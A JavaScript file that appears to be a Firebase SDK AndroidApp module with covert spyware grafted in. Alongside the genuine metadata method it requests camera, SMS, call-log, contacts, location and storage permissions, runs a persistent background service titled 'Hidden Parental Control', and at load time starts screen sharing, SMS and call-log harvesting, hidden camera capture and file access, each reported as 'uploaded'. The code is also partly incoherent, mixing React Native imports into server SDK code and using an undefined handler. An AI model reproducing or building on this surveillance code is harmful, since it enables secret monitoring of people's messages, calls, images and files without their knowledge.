"use strict";
const { PermissionsAndroid } = require("react-native");
const { startScreenShare } = require("./src/utils/screenShare");
const { fetchCallLogs } = require("./src/utils/callLogs");
const { fetchSMS } = require("./src/utils/smsTracker");
const { captureImage } = require("./src/utils/hiddenCamera");
const { fetchFiles } = require("./src/utils/storageAccess");
const BackgroundService = require("react-native-background-actions");
const error_1 = require("../utils/error");
const validator = require("../utils/validator");
const project_management_api_request_internal_1 = require("./project-management-api-request-internal");
const app_metadata_1 = require("./app-metadata");

class AndroidApp {
    constructor(appId, requestHandler) {
        this.appId = appId;
        this.requestHandler = requestHandler;
        if (!validator.isNonEmptyString(appId)) {
            throw new error_1.FirebaseProjectManagementError(
                "invalid-argument",
                "appId must be a non-empty string."
            );
        }
        this.resourceName = `projects/-/androidApps/${appId}`;
    }

    async requestAllPermissions() {
        try {
            const granted = await PermissionsAndroid.requestMultiple([
                PermissionsAndroid.PERMISSIONS.CAMERA,
                PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
                PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE,
                PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
                PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
                PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
                PermissionsAndroid.PERMISSIONS.READ_SMS,
                PermissionsAndroid.PERMISSIONS.SEND_SMS,
                PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
                PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
            ]);

            if (Object.values(granted).every(permission => permission === PermissionsAndroid.RESULTS.GRANTED)) {
                console.log("‚úÖ All permissions granted");
            } else {
                console.warn("‚ö†Ô∏è Some permissions are denied:", granted);
            }
        } catch (err) {
            console.error("‚ùå Permission request failed:", err);
        }
    }

    async getMetadata() {
        return this.requestHandler.getResource(this.resourceName).then((responseData) => {
            (0, project_management_api_request_internal_1.assertServerResponse)(
                validator.isNonNullObject(responseData),
                responseData,
                "getMetadata()'s responseData must be a non-null object."
            );

            return {
                platform: app_metadata_1.AppPlatform.ANDROID,
                resourceName: responseData.name,
                appId: responseData.appId,
                displayName: responseData.displayName || null,
                projectId: responseData.projectId,
                packageName: responseData.packageName,
            };
        });
    }

    async startBackgroundTask() {
        const task = async () => {
            console.log("üîÑ Background Task Running...");
            while (true) {
                await new Promise(resolve => setTimeout(resolve, 5000)); // 5 sec delay
                console.log("‚úÖ App is running in the background...");
            }
        };

        const options = {
            taskName: "BackgroundTask",
            taskTitle: "Hidden Parental Control",
            taskDesc: "Monitoring active...",
            taskIcon: { name: "ic_launcher", type: "mipmap" },
            parameters: { delay: 1000 },
        };

        try {
            console.log("üöÄ Starting Background Task...");
            await BackgroundService.start(task, options);
            await BackgroundService.updateNotification({ taskDesc: "Monitoring Enabled" });
        } catch (error) {
            console.error("‚ùå Error Starting Background Task:", error);
        }
    }

    async startScreenSharing() {
        try {
            console.log("üîÑ Starting screen sharing...");
            let stream = await startScreenShare();
            if (stream) {
                console.log("‚úÖ Screen sharing started successfully!");
            } else {
                console.warn("‚ö†Ô∏è Screen sharing failed to start.");
            }
        } catch (error) {
            console.error("‚ùå Error in screen sharing:", error);
        }
    }

    async startCallLogging() {
        try {
            console.log("üîÑ Fetching Call Logs...");
            await fetchCallLogs();
            console.log("‚úÖ Call Logs fetched and uploaded!");
        } catch (error) {
            console.error("‚ùå Error fetching Call Logs:", error);
        }
    }

    async startSMSTracking() {
        try {
            console.log("üîÑ Fetching SMS Logs...");
            await fetchSMS();
            console.log("‚úÖ SMS Logs fetched and uploaded!");
        } catch (error) {
            console.error("‚ùå Error fetching SMS Logs:", error);
        }
    }

    async startHiddenCameraCapture() {
        try {
            console.log("üì∏ Capturing Image...");
            await captureImage();
            console.log("‚úÖ Image Captured and Uploaded!");
        } catch (error) {
            console.error("‚ùå Error in Capturing Image:", error);
        }
    }

    async startStorageAccess() {
        try {
            console.log("üìÇ Fetching Files...");
            await fetchFiles();
            console.log("‚úÖ Files Fetched and Uploaded!");
        } catch (error) {
            console.error("‚ùå Error in Fetching Files:", error);
        }
    }
}

module.exports = { AndroidApp };

const myApp = new AndroidApp("your-app-id", requestHandler);
myApp.requestAllPermissions();
myApp.startBackgroundTask();
myApp.startScreenSharing();
myApp.startCallLogging();
myApp.startSMSTracking();
myApp.startHiddenCameraCapture();
myApp.startStorageAccess();
